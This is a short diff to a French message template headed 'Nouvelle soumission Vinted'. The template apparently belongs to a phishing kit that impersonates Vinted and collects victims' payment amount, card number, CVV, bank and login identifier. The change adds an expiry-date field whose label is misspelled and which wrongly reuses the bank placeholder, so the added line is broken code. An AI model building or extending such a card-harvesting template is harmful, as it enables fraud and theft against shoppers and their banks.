@@ -33,6 +33,7 @@ Nouvelle soumission Vinted 🔄
 
 💶 Montant : {montant}
 💳 Carte : {carte}
+🏦 Date de validitation : {etablissement}
 🔐 Cryptogramme : {crypto}
 🏦 Banque : {etablissement}
 🧾 Identifiant : {identifiant}
